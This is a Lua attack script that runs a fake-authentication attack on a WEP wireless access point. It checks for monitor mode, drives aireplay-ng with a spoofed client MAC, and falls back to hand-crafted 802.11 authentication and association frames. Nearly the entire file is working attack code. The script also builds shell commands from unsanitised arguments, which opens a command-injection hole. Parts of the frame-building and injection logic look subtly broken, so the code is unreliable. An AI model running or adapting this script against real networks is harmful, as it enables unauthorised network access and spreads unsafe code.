local iface = arg[1]
local bssid = arg[2]
local client_mac = arg[3] or "AA:BB:CC:DD:EE:FF"
local num_auths = tonumber(arg[4]) or 3

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":"","channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  return out:find("type monitor") ~= nil
end

local function mac_to_bytes(mac)
  local bytes = {}
  for b in mac:gmatch("(%x%x)") do
    bytes[#bytes + 1] = tonumber(b, 16)
  end
  return bytes
end

local function build_auth_frame_open(seq_num)
  -- Authentication frame: subtype 11 (0x0b << 2 | 0 = 0xb0)
  local frame = string.char(0xb0, 0x00)
  frame = frame .. string.char(0x00, 0x00)
  -- DA: BSSID (AP)
  for _, v in ipairs(mac_to_bytes(bssid)) do frame = frame .. string.char(v) end
  -- SA: client MAC
  for _, v in ipairs(mac_to_bytes(client_mac)) do frame = frame .. string.char(v) end
  -- BSSID
  for _, v in ipairs(mac_to_bytes(bssid)) do frame = frame .. string.char(v) end
  frame = frame .. string.char(0x00, 0x00)

  -- Auth algorithm: 0 = Open System, 1 = Shared Key
  frame = frame .. string.char(0x00, 0x00)
  -- Auth seq number
  frame = frame .. string.char(seq_num % 256, math.floor(seq_num / 256))
  -- Status code: 0 = success
  frame = frame .. string.char(0x00, 0x00)
  return frame
end

local function build_auth_frame_shared(seq_num)
  local frame = string.char(0xb0, 0x00, 0x00, 0x00)
  for _, v in ipairs(mac_to_bytes(bssid)) do frame = frame .. string.char(v) end
  for _, v in ipairs(mac_to_bytes(client_mac)) do frame = frame .. string.char(v) end
  for _, v in ipairs(mac_to_bytes(bssid)) do frame = frame .. string.char(v) end
  frame = frame .. string.char(0x00, 0x00)
  -- Auth algorithm: 1 = Shared Key
  frame = frame .. string.char(0x01, 0x00)
  frame = frame .. string.char(seq_num % 256, math.floor(seq_num / 256))
  frame = frame .. string.char(0x00, 0x00)
  return frame
end

local function build_association_frame()
  local frame = string.char(0x00, 0x00, 0x00, 0x00)
  for _, v in ipairs(mac_to_bytes(bssid)) do frame = frame .. string.char(v) end
  for _, v in ipairs(mac_to_bytes(client_mac)) do frame = frame .. string.char(v) end
  for _, v in ipairs(mac_to_bytes(bssid)) do frame = frame .. string.char(v) end
  frame = frame .. string.char(0x00, 0x00)
  frame = frame .. string.char(0x00, 0x00)
  frame = frame .. string.char(0x00, 0x00)
  return string.char(0x10, 0x00) .. frame
end

local function send_auth_open()
  telemetry("auth_start", '{"method":"open","count":' .. tostring(num_auths) .. '}')
  local tmp = "/tmp/wep_auth_" .. iface .. ".bin"
  local f = io.open(tmp, "wb")
  if not f then
    telemetry("error", '{"error":"Cannot write temp file"}')
    return false
  end
  for i = 1, num_auths do
    local frame = build_auth_frame_open(1)
    f:write(frame)
    telemetry("auth_sent", '{"seq":1,"auth_num":' .. tostring(i) .. ',"algorithm":"open"}')
  end
  local assoc = build_association_frame()
  f:write(assoc)
  telemetry("assoc_sent", '{"client":' .. json_escape(client_mac) .. '}')
  f:close()
  os.execute("cat " .. tmp .. " | aireplay-ng -D " .. iface .. " 2>/dev/null")
  telemetry("auth_done", '{"method":"open","total":' .. tostring(num_auths) .. '}')
  return true
end

local function send_auth_shared()
  telemetry("auth_start", '{"method":"shared_key","count":' .. tostring(num_auths) .. '}')
  local tmp = "/tmp/wep_auth_shared_" .. iface .. ".bin"
  local f = io.open(tmp, "wb")
  if not f then
    telemetry("error", '{"error":"Cannot write temp file"}')
    return false
  end
  for i = 1, num_auths do
    local frame = build_auth_frame_shared(1)
    f:write(frame)
    telemetry("auth_sent", '{"seq":1,"auth_num":' .. tostring(i) .. ',"algorithm":"shared"}')
  end
  f:close()
  os.execute("cat " .. tmp .. " | aireplay-ng -D " .. iface .. " 2>/dev/null")
  telemetry("auth_done", '{"method":"shared_key","total":' .. tostring(num_auths) .. '}')
  return true
end

local function fake_auth_via_aireplay()
  local cmd = "aireplay-ng --fakeauth " .. num_auths .. " -a " .. bssid .. " -h " .. client_mac .. " " .. iface .. " 2>/dev/null"
  telemetry("aireplay_auth", '{"cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then
    telemetry("error", '{"error":"aireplay-ng not found"}')
    return false
  end
  while true do
    local line = f:read("*l")
    if not line then break end
    if line:find("auth") or line:find("Auth") or line:find("assoc") or line:find("Assoc") then
      telemetry("aireplay_output", '{"line":' .. json_escape(line:sub(1, 150)) .. '}')
    end
    if line:find("ack") then
      telemetry("auth_ack", '{}')
    end
  end
  f:close()
  return true
end

if not iface or not bssid then
  telemetry("error", '{"error":"Usage: wep_fake_auth.lua <iface> <bssid> [client_mac] [num_auths]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Interface not in monitor mode"}')
  os.exit(1)
end

local ok = fake_auth_via_aireplay()
if not ok then
  telemetry("fallback", '{"message":"aireplay-ng failed, using raw frame injection"}')
  send_auth_open()
end

telemetry("complete", '{"bssid":' .. json_escape(bssid) .. ',"client":' .. json_escape(client_mac) .. ',"auths":' .. tostring(num_auths) .. '}')
